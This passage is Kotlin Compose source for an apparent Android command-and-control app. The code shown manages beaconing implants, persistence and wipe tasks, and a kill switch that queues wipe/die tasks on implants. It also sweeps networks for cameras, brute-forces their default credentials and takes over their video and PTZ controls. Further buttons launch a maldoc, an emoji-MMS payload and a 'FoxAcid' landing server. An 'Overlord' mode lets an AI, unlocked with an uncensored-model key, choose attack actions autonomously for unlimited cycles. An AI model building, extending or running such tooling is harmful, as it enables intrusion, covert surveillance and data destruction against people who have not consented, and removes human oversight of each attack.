    var armConfirm by remember { mutableStateOf(false) }
    var showEmojiDlg by remember { mutableStateOf(false) }
    var showScanDlg by remember { mutableStateOf(false) }
    var scanTarget by rememberSaveable { mutableStateOf(Net.localScope()) }
    var scanPorts by rememberSaveable { mutableStateOf("22,80,443,554,1900,3306,3389,5555,8000,8080,8899") }
    var scanTiming by rememberSaveable { mutableStateOf(3) }
    var scanBusy by remember { mutableStateOf(false) }
    var scanResults by remember { mutableStateOf<List<ZenScan.HostResult>>(emptyList()) }
    val aiReady = AiGate.ready()

    Box(Modifier.fillMaxSize()) {
        Column(
            Modifier
                .fillMaxSize()
                .verticalScroll(rememberScrollState())
                .padding(horizontal = 20.dp),
        ) {
            Text("Dashboard", style = QuantumTypography.displaySmall, color = Cyan)
            Spacer(Modifier.height(4.dp))

            // ---- C2 destination indicator (self-host vs remote-connect) --------
            val c2Settings by QuantSettings.state.collectAsState()
            Row(
                verticalAlignment = Alignment.CenterVertically,
                modifier = Modifier.padding(bottom = 8.dp),
            ) {
                val isSelfHost = c2Settings.c2Mode == "self_host"
                Icon(
                    if (isSelfHost) Icons.Outlined.Dashboard else Icons.Outlined.Wifi,
                    contentDescription = null,
                    tint = if (isSelfHost) Ok else SoftCyan,
                    modifier = Modifier.size(16.dp),
                )
                Spacer(Modifier.width(6.dp))
                Text(
                    if (isSelfHost) "Self-Host C2"
                    else "Remote-Connect: ${c2Settings.c2RemoteHost}",
                    style = QuantumTypography.labelSmall,
                    color = if (isSelfHost) Ok else SoftCyan,
                )
                if (!isSelfHost) {
                    Spacer(Modifier.width(8.dp))
                    TextButton(
                        onClick = {
                            openUrl(
                                ctx,
                                "${c2Settings.c2RemoteHost.trim().removeSuffix("/")}/dash",
                            )
                        },
                        enabled = c2Settings.c2RemoteHost.isNotBlank(),
                    ) {
                        Text(
                            "open web panel",
                            style = QuantumTypography.labelSmall,
                            color = Cyan,
                        )
                    }
                }
            }

            // ---- operator status strip (ROOT/VPN/IP/MAC/DNS+proxy) ---------
            DashboardStatusStrip()
            Spacer(Modifier.height(8.dp))

        // ---- autonomous control -------------------------------------------
        Button(
            onClick = { if (overlordRunning) Overlord.stop() else showAutoRunDlg = true },
            enabled = overlordRunning || aiReady,
            modifier = Modifier.fillMaxWidth(),
        ) {
            Icon(
                if (overlordRunning) Icons.Outlined.Stop else Icons.Outlined.PlayArrow,
                contentDescription = null,
            )
            Spacer(Modifier.width(8.dp))
            Text(if (overlordRunning) "STOP AUTO RUN" else "AUTO RUN")
        }
        if (!aiReady && !overlordRunning) {
            Text(
                "Auto Run is locked until the Abliteration.ai key or the local fallback " +
                    "model is configured — open the Setup wizard in the sidebar.",
                style = QuantumTypography.labelSmall,
                color = Muted,
                modifier = Modifier.padding(top = 4.dp),
            )
        }
        if (overlordRunning) {
            Text(
                "Overlord cycle running" +
                    if (Overlord.cameraOnly) " (camera-only)" else " (full act whitelist)",
                style = QuantumTypography.labelSmall,
                color = Ok,
                modifier = Modifier.padding(top = 4.dp),
            )
        }

        // ---- channel kill-switch notices (always loud, operator can override) ----
        val killNotices by FeatureRegistry.killSwitchNotices.collectAsState()
        killNotices.forEach { notice ->
            Text(
                "⚠ $notice",
                style = QuantumTypography.labelSmall,
                color = Danger,
                modifier = Modifier.padding(top = 4.dp),
            )
        }

        // ---- live job card: the universal job UX on the flagship flow --------
        if (overlordRunning) {
            Spacer(Modifier.height(8.dp))
            JobCard(
                state = JobCardState(
                    phase = JobPhase.RUNNING,
                    title = "Overlord autonomous cycle",
                    tail = audit.takeLast(3).map { "${it.tag}: ${it.msg}" },
                    cancelable = true,
                    lastLine = audit.lastOrNull()?.msg,
                    linkedTo = "NETWORK",
                ),
                onOpenLogs = { /* log console below is the log surface */ },
                onStop = { Overlord.stop() },
            )
        }

        Spacer(Modifier.height(8.dp))

        // ---- quick manual ops ---------------------------------------------
        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            FilledTonalButton(
                onClick = { showScanDlg = true },
                modifier = Modifier.weight(1f),
            ) { Text("SCAN NET") }
            FilledTonalButton(
                onClick = {
                    ioOp("CAM") {
                        val cams = CamWar.discover(Net.localScope(), bruteCreds = false)
                        C2State.setCameras(cams)
                        "cam sweep done: ${cams.size} camera(s)"
                    }
                },
                modifier = Modifier.weight(1f),
            ) { Text("CAM SWEEP") }
        }
        Spacer(Modifier.height(8.dp))

        // ---- second quick-op row: flashfill / emojisms / macreset / maldoc --
        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            FilledTonalButton(
                onClick = { ioOp("OK") { c2Api.handle("flashfill") } },
                modifier = Modifier.weight(1f),
            ) { Text("FLASHFILL") }
            FilledTonalButton(
                onClick = { showEmojiDlg = true },
                modifier = Modifier.weight(1f),
            ) { Text("EMOJISMS") }
            FilledTonalButton(
                onClick = { ioOp("OPSEC") { c2Api.handle("macreset") } },
                modifier = Modifier.weight(1f),
            ) { Text("MACRESET") }
            FilledTonalButton(
                onClick = {
                    ioOp("ATK") {
                        c2Api.handle("mshtmaldoc", JSONObject().put("ip", Net.localIp()))
                    }
                },
                modifier = Modifier.weight(1f),
            ) { Text("MALDOC") }
        }
        Spacer(Modifier.height(8.dp))

        // ---- federation mesh + foxacid landing server ------------------------
        FederationFoxAcidCard()
        Spacer(Modifier.height(8.dp))

        // ---- kill switch ----------------------------------------------------
        KillSwitchCard(armed = killswitch, onArm = { armConfirm = true }, onDisarm = {
            ioOp("OPSEC") { C2State.disarmKillswitch(); "kill-switch disarmed" }
        })
        if (armConfirm) {
            AlertDialog(
                onDismissRequest = { armConfirm = false },
                containerColor = Panel,
                title = { Text("Arm kill switch?", color = Danger) },
                text = {
                    Text(
                        "A wipe/die task is queued on every known implant and further " +
                            "autonomous actions halt. Queued wipe tasks cannot be recalled.",
                        color = Softest,
                        style = QuantumTypography.bodyMedium,
                    )
                },
                confirmButton = {
                    Button(onClick = {
                        armConfirm = false
                        ioOp("OPSEC") {
                            val hosts = C2State.killAll(true)
                            "KILLSWITCH engaged — ${hosts.size} implant(s) queued"
                        }
                    }) { Text("ARM", color = Danger) }
                },
                dismissButton = {
                    TextButton(onClick = { armConfirm = false }) { Text("Cancel") }
                },
            )
        }

        Spacer(Modifier.height(8.dp))

        // ---- live stats — drag/lock/arrange grid (persisted per route) --------
        WidgetGrid(
            route = "dashboard",
            initialOrder = listOf("implants", "decisions", "c2server", "killswitch", "audit", "ai"),
        ) { id ->
            when (id) {
                "implants" -> StatusCard("Implants", "${implants.size} active")
                "decisions" -> StatusCard("Decisions", "${decisions.size} total")
                "c2server" -> StatusCard("C2 server", if (serverRunning) "running :${QuantServerManager.boundPort}" else "stopped")
                "killswitch" -> StatusCard("Kill-switch", if (killswitch) "ARMED" else "safe")
                "audit" -> StatusCard("Audit events", "${audit.size} logged")
                else -> StatusCard("AI", AiGate.modeLabel())
            }
        }

        // ---- Project Zero feed card -------------------------------------------
        ProjectZeroFeedCard()
        Spacer(Modifier.height(8.dp))

        // ---- verbose console -------------------------------------------------
        LogConsole(audit)
        Spacer(Modifier.height(16.dp))
        }

        // ---- floating chat FAB (opens the chat overlay) ------------------------
        FloatingActionButton(
            onClick = { UiBus.chatOpenRequest.value++ },
            modifier = Modifier
                .align(Alignment.BottomEnd)
                .padding(16.dp),
            containerColor = PanelBright,
            contentColor = Cyan,
        ) {
            Icon(Icons.Outlined.ChatBubble, contentDescription = "Open chat")
        }
    }

    if (showAutoRunDlg) {
        AutoRunDialog(
            initialCameraOnly = QuantSettings.state.value.overlordCameraOnly,
            initialInterval = QuantSettings.state.value.overlordIntervalSec,
            onDismiss = { showAutoRunDlg = false },
        )
    }
    if (showEmojiDlg) {
        EmojiSmsDialog(onDismiss = { showEmojiDlg = false })
    }
    if (showScanDlg) {
        ScanNetDialog(
            initialTarget = scanTarget,
            initialPorts = scanPorts,
            initialTiming = scanTiming,
            onDismiss = { showScanDlg = false },
            onResults = { results ->
                scanResults = results
                C2State.audit(
                    "NET",
                    "dashboard scan: ${results.size} host(s) with open ports"
                )
            },
        )
    }
}

// ---------------------------------------------------------------------------
// Dashboard — operator status strip + Project Zero feed card
// ---------------------------------------------------------------------------

/** Snapshot of the compact dashboard status chips. */
private data class DashboardStatus(
    val root: String = "…",
    val vpn: String = "…",
    val ip: String = "…",
    val mac: String = "…",
    val dnsProxy: String = "…",
)

/** Compact ROOT/VPN/IP/MAC/DNS+proxy chip row — non-blocking (IO probe). */
@Composable
private fun DashboardStatusStrip() {
    var st by remember { mutableStateOf(DashboardStatus()) }
    LaunchedEffect(Unit) {
        st = withContext(Dispatchers.IO) { probeOperatorStatus() }
    }
    Row(
        Modifier
            .fillMaxWidth()
            .quantumPanel()
            .padding(8.dp),
        horizontalArrangement = Arrangement.spacedBy(6.dp),
    ) {
        StatusChip("ROOT", st.root)
        StatusChip("VPN", st.vpn)
        StatusChip("IP", st.ip)
        StatusChip("MAC", st.mac)
        StatusChip("DNS/PROXY", st.dnsProxy)
    }
}

@Composable
private fun StatusChip(label: String, value: String) {
    Column(
        Modifier
            .quantumPanel()
            .padding(horizontal = 8.dp, vertical = 4.dp),
    ) {
        Text(label, style = QuantumTypography.labelSmall, color = Muted, fontSize = 9.sp)
        Text(value.take(16), style = QuantumTypography.labelSmall, color = SoftCyan, fontSize = 10.sp)
    }
}

/** All chip probes; must run off the main thread. */
private fun probeOperatorStatus(): DashboardStatus {
    // ROOT — su -c id probe (no-root devices fail fast).
    val root = try {
        val p = Runtime.getRuntime().exec(arrayOf("su", "-c", "id"))
        val out = p.inputStream.readBytes().toString(Charsets.UTF_8)
        val code = p.waitFor()
        if (code == 0 && out.contains("uid=0")) "granted" else "no"
    } catch (e: Exception) {
        "no"
    }
    // VPN / MAC — NetDiag interface snapshot.
    val ifaces = NetDiag.interfaces()
    val vpn = if (ifaces.any { it.vpn && it.up }) "on" else "off"
    val mac = ifaces.firstOrNull { it.up && !it.loopback && !it.mac.isNullOrBlank() }?.mac ?: "—"
    // Public egress IP via ipify.
    val ip = try {
        val r = Net.httpGet("https://api.ipify.org", timeoutMs = 5000)
        if (r.error == null && r.ok) r.text().trim().take(16) else "—"
    } catch (e: Exception) {
        "—"
    }
    // DNS resolution + system proxy.
    val dns = if (NetDiag.dnsLookup("dns.google").isNotEmpty()) "ok" else "fail"
    val proxy = NetDiag.proxyInfo() ?: "none"
    return DashboardStatus(root, vpn, ip, mac, "$dns · pxy ${proxy.take(10)}")
}

/** Project Zero blog feed card — latest 3 posts, tappable + refreshable. */
@Composable
private fun ProjectZeroFeedCard() {
    val ctx = LocalContext.current
    val scope = rememberCoroutineScope()
    var entries by remember { mutableStateOf<List<ProjectZeroFeed.Entry>>(emptyList()) }
    var status by remember { mutableStateOf("loading feed…") }
    var loading by remember { mutableStateOf(false) }

    fun load() {
        loading = true
        scope.launch {
            val result = withContext(Dispatchers.IO) {
                runCatching { ProjectZeroFeed.latest(3) }
            }
            result.onSuccess {
                entries = it
                status = if (it.isEmpty()) "no entries" else "latest ${it.size} post(s)"
            }.onFailure {
                entries = emptyList()
                status = "feed error: ${it.message}"
            }
            loading = false
        }
    }

    LaunchedEffect(Unit) { load() }

    Column(Modifier.fillMaxWidth().quantumPanel().padding(12.dp)) {
        Row(verticalAlignment = Alignment.CenterVertically) {
            Text(
                "Project Zero feed",
                style = QuantumTypography.titleSmall,
                color = SoftCyan,
                modifier = Modifier.weight(1f),
            )
            IconButton(onClick = { load() }, enabled = !loading) {
                Icon(Icons.Outlined.Refresh, contentDescription = "Refresh feed", tint = Cyan)
            }
        }
        if (loading) {
            Text("loading…", style = QuantumTypography.labelSmall, color = Muted)
        }
        entries.forEach { e ->
            Text(
                e.title,
                style = QuantumTypography.bodySmall,
                color = Softest,
                modifier = Modifier
                    .padding(vertical = 3.dp)
                    .clickable { if (e.link.isNotBlank()) openUrl(ctx, e.link) },
            )
            if (e.published.isNotBlank()) {
                Text(e.published.take(10), style = QuantumTypography.labelSmall, color = Muted)
            }
        }
        Text(status, style = QuantumTypography.labelSmall, color = Muted)
    }
}

@Composable
private fun KillSwitchCard(armed: Boolean, onArm: () -> Unit, onDisarm: () -> Unit) {
    Column(Modifier.fillMaxWidth().quantumPanel().padding(12.dp)) {
        Row(verticalAlignment = Alignment.CenterVertically) {
            Column(Modifier.weight(1f)) {
                Text("Kill switch", style = QuantumTypography.titleSmall, color = SoftCyan)
                Text(
                    if (armed) "ARMED — implants queued to wipe/die, overlord halting"
                    else "safe — implants keep beaconing",
                    style = QuantumTypography.bodySmall,
                    color = if (armed) Danger else Muted,
                )
            }
            Button(
                onClick = { if (armed) onDisarm() else onArm() },
                colors = ButtonDefaults.buttonColors(
                    containerColor = if (armed) Ok.copy(alpha = 0.2f) else Danger.copy(alpha = 0.25f),
                    contentColor = if (armed) Ok else Danger,
                ),
            ) {
                Text(if (armed) "DISARM" else "ARM")
            }
        }
    }
}

/** Prefer a human field from a status JSON; fall back to a trimmed dump. */
private fun statusSummary(prefix: String, r: JSONObject): String {
    if (r.has("error")) return "$prefix ERR: ${r.optString("error")}"
    val st = r.optString("status", "").ifBlank {
        r.optString("state", "").ifBlank { r.optString("mode", "") }
    }
    return if (st.isNotBlank()) "$prefix $st" else "$prefix ${r.toString().take(60)}"
}

/** Federation peer-mesh status + FoxAcid landing-server start/stop chips. */
@Composable
private fun FederationFoxAcidCard() {
    val scope = rememberCoroutineScope()
    var fedStatus by remember { mutableStateOf("federation: tap FEDERATION to query the peer mesh") }
    var foxStatus by remember { mutableStateOf("foxacid: tap START/STOP to toggle the landing server") }
    fun fox(action: String) {
        scope.launch {
            val r = withContext(Dispatchers.IO) {
                c2Api.handle("foxacid", JSONObject().put("action", action))
            }
            foxStatus = statusSummary("foxacid:", r)
        }
    }
    Column(Modifier.fillMaxWidth().quantumPanel().padding(12.dp)) {
        Text("Federation / FoxAcid", style = QuantumTypography.titleSmall, color = SoftCyan)
        Spacer(Modifier.height(8.dp))
        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedButton(
                onClick = {
                    scope.launch {
                        val r = withContext(Dispatchers.IO) { c2Api.handle("federation") }
                        fedStatus = statusSummary("federation:", r)
                    }
                },
                modifier = Modifier.weight(1f),
            ) { Text("FEDERATION") }
        }
        Spacer(Modifier.height(6.dp))
        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            OutlinedButton(
                onClick = { fox("start") },
                modifier = Modifier.weight(1f),
            ) { Text("FOXACID START") }
            OutlinedButton(
                onClick = { fox("stop") },
                modifier = Modifier.weight(1f),
            ) { Text("FOXACID STOP") }
        }
        Text(fedStatus, style = QuantumTypography.bodySmall, color = SoftCyan, fontSize = 11.sp)
        Text(foxStatus, style = QuantumTypography.bodySmall, color = SoftCyan, fontSize = 11.sp)
    }
}

/** Small text prompt for the emojisms staging payload (default "ping"). */
@Composable
private fun EmojiSmsDialog(onDismiss: () -> Unit) {
    var text by rememberSaveable { mutableStateOf("ping") }
    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = Panel,
        title = { Text("EMOJISMS payload", color = Cyan) },
        text = {
            Column {
                Text(
                    "Stage the emoji-MMS payload with this message text.",
                    style = QuantumTypography.bodySmall,
                    color = Muted,
                )
                Spacer(Modifier.height(8.dp))
                OutlinedTextField(
                    value = text,
                    onValueChange = { text = it },
                    label = { Text("text") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                )
            }
        },
        confirmButton = {
            Button(onClick = {
                val t = text.ifBlank { "ping" }
                onDismiss()
                ioOp("OK") {
                    c2Api.handle("emojisms", JSONObject().put("text", t))
                }
            }) { Text("SEND") }
        },
        dismissButton = { TextButton(onClick = onDismiss) { Text("Cancel") } },
    )
}

@Composable
private fun AutoRunDialog(
    initialCameraOnly: Boolean,
    initialInterval: Int,
    onDismiss: () -> Unit,
) {
    var cameraOnly by remember { mutableStateOf(initialCameraOnly) }
    var interval by remember { mutableStateOf(initialInterval.toFloat()) }
    var aggression by remember { mutableStateOf(QuantSettings.state.value.overlordAggression) }
    var cyclesText by remember {
        mutableStateOf(QuantSettings.state.value.overlordCycles.toString())
    }
    AlertDialog(
        onDismissRequest = onDismiss,
        containerColor = Panel,
        title = { Text("Auto Run — Overlord cycle", color = Cyan) },
        text = {
            Column {
                Text(
                    "The autonomous loop decides one action per interval (AI-driven, " +
                        "QBrain deterministic fallback) and journals every decision to " +
                        "this dashboard.",
                    style = QuantumTypography.bodySmall,
                    color = Muted,
                )
                Spacer(Modifier.height(12.dp))
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Text("Camera-only acts", color = Softest, modifier = Modifier.weight(1f))
                    Switch(checked = cameraOnly, onCheckedChange = { cameraOnly = it })
                }
                Text(
                    "Restricts the whitelist to cam_war / cam_discover / cam_control / " +
                        "mitre_report / rest.",
                    style = QuantumTypography.labelSmall,
                    color = Muted,
                )
                Spacer(Modifier.height(12.dp))
                Text("Interval: ${interval.toInt()}s", color = Softest)
                Slider(
                    value = interval,
                    onValueChange = { interval = it },
                    valueRange = 10f..300f,
                    steps = 57,
                )
                Spacer(Modifier.height(8.dp))
                Text("Aggression", color = Softest, style = QuantumTypography.bodySmall)
                Row(Modifier.fillMaxWidth()) {
                    listOf("balanced", "aggressive", "patient").forEach { ag ->
                        Row(
                            Modifier.weight(1f),
                            verticalAlignment = Alignment.CenterVertically,
                        ) {
                            RadioButton(selected = aggression == ag, onClick = { aggression = ag })
                            Text(ag, color = SoftCyan, style = QuantumTypography.labelSmall)
                        }
                    }
                }
                OutlinedTextField(
                    value = cyclesText,
                    onValueChange = { cyclesText = it.filter { c -> c.isDigit() }.take(5) },
                    label = { Text("Cycles (0 = infinite)") },
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                )
            }
        },
        confirmButton = {
            Button(onClick = {
                QuantSettings.update {
                    it.copy(
                        overlordCameraOnly = cameraOnly,
                        overlordIntervalSec = interval.toInt(),
                        overlordAggression = aggression,
                        overlordCycles = cyclesText.toIntOrNull() ?: 0,
                    )
                }
                val ok = AutoRun.start(cameraOnly, interval.toInt())
                if (ok) onDismiss()
            }) { Text("Start") }
        },
        dismissButton = { TextButton(onClick = onDismiss) { Text("Cancel") } },
    )
}

@Composable
fun LogConsole(audit: List<AuditEvent>) {
    val ctx = LocalContext.current
    var autoScroll by rememberSaveable { mutableStateOf(true) }
    var showLog by remember { mutableStateOf(false) }
    var pendingLog by remember { mutableStateOf<String?>(null) }
    val saveLogPicker = rememberLauncherForActivityResult(
        ActivityResultContracts.CreateDocument("text/plain")
    ) { uri ->
        val content = pendingLog
        pendingLog = null
        if (uri != null && content != null) {
            try {
                ctx.contentResolver.openOutputStream(uri)?.use { out ->
                    out.write(content.toByteArray())
                }
                C2State.audit("SYS", "console log saved via SAF")
            } catch (e: Exception) {
                C2State.audit("ERR", "console log save failed: ${e.message}")
            }
        }
    }
    val listState = rememberLazyListState()
    val visible = audit.takeLast(150)
    LaunchedEffect(visible.size, autoScroll) {
        if (autoScroll && visible.isNotEmpty()) listState.animateScrollToItem(visible.size - 1)
    }
    Column(Modifier.fillMaxWidth().quantumPanel().padding(8.dp)) {
        Row(verticalAlignment = Alignment.CenterVertically) {
            Text("console", style = QuantumTypography.titleSmall, color = SoftCyan)
            Spacer(Modifier.weight(1f))
            Text("auto-scroll", style = QuantumTypography.labelSmall, color = Muted)
            Switch(checked = autoScroll, onCheckedChange = { autoScroll = it })
            IconButton(onClick = { showLog = true }) {
                Icon(Icons.Outlined.Visibility, contentDescription = "View console log", tint = SoftCyan)
            }
            IconButton(onClick = {
                pendingLog = audit.joinToString("\n") { ev ->
                    "[${ev.ts}] ${ev.tag}: ${ev.msg}"
                }
                saveLogPicker.launch("quantum-console-log.txt")
            }) {
                Icon(Icons.Outlined.Download, contentDescription = "Download console log", tint = SoftCyan)
            }
            IconButton(onClick = { C2State.clearAuditUi() }) {
                Icon(Icons.Outlined.Delete, contentDescription = "Clear console", tint = Muted)
            }
        }
        LazyColumn(state = listState, modifier = Modifier.fillMaxWidth().height(230.dp)) {
            items(visible) { ev ->
                val color = when {
                    ev.tag == "ERR" -> Danger
                    ev.tag == "ATK" || ev.tag == "CAM" -> Cyan
                    ev.tag == "OPSEC" -> Ok
                    else -> SoftCyan
                }
                Text(
                    "[${ev.ts.substringAfter('T', ev.ts)}] ${ev.tag}: ${ev.msg}",
                    style = QuantumTypography.bodySmall,
                    color = color,
                    fontSize = 10.sp,
                    lineHeight = 13.sp,
                )
            }
        }
    }

    if (showLog) {
        AlertDialog(
            onDismissRequest = { showLog = false },
            title = { Text("Console log — full", style = QuantumTypography.titleSmall, color = Cyan) },
            text = {
                LazyColumn(Modifier.fillMaxWidth().height(420.dp)) {
                    items(audit) { ev ->
                        val color = when {
                            ev.tag == "ERR" -> Danger
                            ev.tag == "ATK" || ev.tag == "CAM" -> Cyan
                            ev.tag == "OPSEC" -> Ok
                            else -> SoftCyan
                        }
                        Text(
                            "[${ev.ts}] ${ev.tag}: ${ev.msg}",
                            style = QuantumTypography.bodySmall,
                            color = color,
                            fontSize = 10.sp,
                            lineHeight = 13.sp,
                        )
                    }
                }
            },
            confirmButton = {
                TextButton(onClick = { showLog = false }) { Text("Close") }
            },
        )
    }
}

// ---------------------------------------------------------------------------
// Implants — registry + per-host task controls
// ---------------------------------------------------------------------------

@Composable
fun ImplantsPage() {
    val implants by C2State.implants.collectAsState()
    Column(
        Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 20.dp),
    ) {
        Text("Implants", style = QuantumTypography.displaySmall, color = Cyan)
        Spacer(Modifier.height(4.dp))
        Text(
            "Beacons appear on first check-in. Queue persistence or artifact-wipe " +
                "tasks per host; implants pull them on the next beacon.",
            style = QuantumTypography.bodySmall,
            color = Muted,
        )
        Spacer(Modifier.height(12.dp))
        if (implants.isEmpty()) {
            Text("No implants beaconed yet.", color = Muted)
        }
        implants.forEach { (host, beacon) ->
            Column(Modifier.fillMaxWidth().quantumPanel().padding(12.dp)) {
                Text(host, style = QuantumTypography.titleSmall, color = Cyan)
                Text(
                    buildString {
                        append("first ${beacon.firstSeen} · last ${beacon.lastSeen} · beacons=${beacon.beacons}")
                        beacon.os?.let { append(" · $it") }
                    },
                    style = QuantumTypography.bodySmall,
                    color = SoftCyan,
                )
                Spacer(Modifier.height(8.dp))
                Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                    FilledTonalButton(onClick = {
                        ioOp("C2") {
                            c2Api.handle("persistx", JSONObject().put("host", host))
                        }
                    }) { Text("PERSIST") }
                    OutlinedButton(onClick = {
                        ioOp("OPSEC") {
                            c2Api.handle("footprint", JSONObject().put("host", host))
                        }
                    }) { Text("WIPE ARTIFACTS") }
                }
            }
            Spacer(Modifier.height(8.dp))
        }
        Spacer(Modifier.height(16.dp))
    }
}

// ---------------------------------------------------------------------------
// Cameras — discovery, brute, snapshots
// ---------------------------------------------------------------------------

@Composable
fun CamerasPage() {
    val cameras by C2State.cameras.collectAsState()
    val scanReq by UiBus.cameraScanRequest.collectAsState()
    val scope = rememberCoroutineScope()
    var cidr by rememberSaveable { mutableStateOf(Net.localScope()) }
    var scanning by remember { mutableStateOf(false) }

    // Chat-driven sweeps land here via UiBus.
    LaunchedEffect(scanReq) {
        val req = scanReq ?: return@LaunchedEffect
        UiBus.cameraScanRequest.value = null
        req.let { cidr = it }
        scanning = true
        withContext(Dispatchers.IO) {
            C2State.setCameras(CamWar.discover(cidr, bruteCreds = true))
            C2State.audit("CAM", "camera sweep $cidr complete")
        }
        scanning = false
    }

    Column(
        Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(horizontal = 20.dp),
    ) {
        Text("Cameras", style = QuantumTypography.displaySmall, color = Cyan)
        Spacer(Modifier.height(12.dp))

        OutlinedTextField(
            value = cidr,
            onValueChange = { cidr = it },
            label = { Text("CIDR scope") },
            singleLine = true,
            modifier = Modifier.fillMaxWidth(),
        )
        Spacer(Modifier.height(8.dp))
        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            Button(
                onClick = {
                    scanning = true
                    scope.launch {
                        withContext(Dispatchers.IO) {
                            C2State.setCameras(CamWar.discover(cidr, bruteCreds = true))
                            C2State.audit(
                                "CAM",
                                "manual sweep $cidr: ${C2State.cameras.value.size} camera(s)"
                            )
                        }
                        scanning = false
                    }
                },
                enabled = !scanning,
            ) { Text(if (scanning) "SWEEPING…" else "DISCOVER + BRUTE") }
            OutlinedButton(
                onClick = { ioOp("CAM") { c2Api.handle("camwar", JSONObject().put("cidr", cidr)) } },
                enabled = !scanning,
            ) { Text("VIA /AI API") }
        }
        if (scanning) {
            LinearProgressIndicator(Modifier.fillMaxWidth().padding(vertical = 8.dp))
        }
        Text(
            "CAM_PORTS: " + CamWar.CAM_PORTS.joinToString(","),
            style = QuantumTypography.labelSmall,
            color = Muted,
            modifier = Modifier.padding(vertical = 4.dp),
        )
        Spacer(Modifier.height(8.dp))

        if (cameras.isEmpty()) {
            Text("No cameras discovered yet — run a sweep.", color = Muted)
        }
        cameras.forEach { cam ->
            CameraCard(cam)
            Spacer(Modifier.height(8.dp))
        }
        Spacer(Modifier.height(16.dp))
    }
}

@Composable
private fun CameraCard(cam: CameraHit) {
    var previewOpen by remember { mutableStateOf(false) }
    // Bumped to force a thumbnail re-fetch (after PTZ moves / preview close).
    var thumbVersion by remember { mutableStateOf(0) }
    Column(Modifier.fillMaxWidth().quantumPanel().padding(12.dp)) {
        CameraThumb(
            cam,
            thumbVersion,
            onOpen = { previewOpen = true },
            onRetry = {
                CamPreview.invalidate(cam.ip)
                thumbVersion++
            },
        )
        Spacer(Modifier.height(8.dp))
        Row(verticalAlignment = Alignment.CenterVertically) {
            Text(
                cam.ip,
                style = QuantumTypography.titleSmall,
                color = Cyan,
                modifier = Modifier.weight(1f),
            )
            Text(
                if (cam.creds != null) "CONTROLLED" else "discovered",
                style = QuantumTypography.labelSmall,
                color = if (cam.creds != null) Ok else Muted,
            )
        }
        Text(
            buildString {
                append("vendor=${cam.vendor} · via ${cam.source}")
                cam.model?.let { append(" · $it") }
            },
            style = QuantumTypography.bodySmall,
            color = SoftCyan,
        )
        Text(
            "ports: " + cam.ports.joinToString(",") + (cam.creds?.let { " · creds=$it" } ?: ""),
            style = QuantumTypography.bodySmall,
            color = Muted,
        )
        Spacer(Modifier.height(8.dp))
        Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
            FilledTonalButton(onClick = {
                ioOp("CAM") {
                    c2Api.handle(
                        "camshot",
                        JSONObject()
                            .put("ip", cam.ip)
                            .put("vendor", cam.vendor)
                            .put("creds", cam.creds ?: ""),
                    )
                }
            }) { Text("SNAPSHOT") }
            OutlinedButton(onClick = {
                ioOp("CAM") {
                    val creds = CamWar.checkCreds(cam.ip, cam.vendor)
                    if (creds != null) {
                        C2State.setCameras(
                            C2State.cameras.value.map {
                                if (it.ip == cam.ip) it.copy(creds = creds) else it
                            }
                        )
                        "brute CRACKED ${cam.ip} ($creds)"
                    } else {
                        "brute ${cam.ip}: no default creds"
                    }
                }
            }) { Text("BRUTE CREDS") }
        }
        Spacer(Modifier.height(8.dp))
        // ---- PTZ nudge row — vendor PTZ over the camera control channel ------
        Row(
            horizontalArrangement = Arrangement.spacedBy(6.dp),
            verticalAlignment = Alignment.CenterVertically,
        ) {
            Text("PTZ", style = QuantumTypography.labelSmall, color = Muted)
            listOf("left" to "◀", "up" to "▲", "down" to "▼", "right" to "▶", "stop" to "■")
                .forEach { (action, glyph) ->
                    OutlinedButton(
                        onClick = {
                            ioOp("CAM") {
                                if (CamWar.ptzNudge(cam.ip, cam.vendor, cam.creds, action)) {
                                    // the view moved — drop the stale thumbnail
                                    CamPreview.invalidate(cam.ip)
                                    thumbVersion++
                                    "PTZ $action ${cam.ip}"
                                } else {
                                    "PTZ $action ${cam.ip} failed"
                                }
                            }
                        },
                        contentPadding = PaddingValues(horizontal = 10.dp, vertical = 2.dp),
                        modifier = Modifier.height(34.dp),
                    ) { Text(glyph, fontSize = 12.sp) }
                }
        }
    }
    if (previewOpen) {
        CameraPreviewDialog(
            cam,
            onDismiss = {
                previewOpen = false
                // pick up whatever the preview last saw as the new thumbnail
                CamPreview.invalidate(cam.ip)
                thumbVersion++
            },
        )
    }
}

/**
 * Live thumbnail tile for a camera card — a real JPEG frame from
 * CamWar.snapshot, decoded small. 2×2-inch (320dp) clickable square with
 * a centered play button that opens the full video-feed preview; the button
 * lights up when the camera is CONTROLLED (creds cracked) and dims
 * otherwise (the feed still tries the default-credential path). A camera
 * that answers no snapshot endpoint shows an honest NO SIGNAL tile that
 * can be retried by tapping.
 */
@Composable
private fun CameraThumb(
    cam: CameraHit,
    version: Int,
    onOpen: () -> Unit,
    onRetry: () -> Unit,
) {
    var thumb by remember(cam.ip, cam.creds) { mutableStateOf<Bitmap?>(null) }
    var loading by remember(cam.ip) { mutableStateOf(false) }
    var failed by remember(cam.ip) { mutableStateOf(false) }

    LaunchedEffect(cam.ip, cam.creds, version) {
        if (thumb != null && version == 0) return@LaunchedEffect
        loading = true
        failed = false
        val bmp = withContext(Dispatchers.IO) {
            CamPreview.thumbnail(cam.ip, cam.vendor, cam.creds)
        }
        thumb = bmp
        failed = bmp == null
        loading = false
    }

    Box(Modifier.fillMaxWidth(), contentAlignment = Alignment.Center) {
        Box(
            Modifier
                .size(320.dp) // 2 x 2 inch physical
                .background(Color.Black)
                .clickable { if (failed) onRetry() else onOpen() },
            contentAlignment = Alignment.Center,
        ) {
            val bmp = thumb
            when {
                bmp != null -> Image(
                    bmp.asImageBitmap(),
                    contentDescription = "live thumbnail ${cam.ip}",
                    modifier = Modifier.fillMaxSize(),
                    contentScale = ContentScale.Crop,
                )
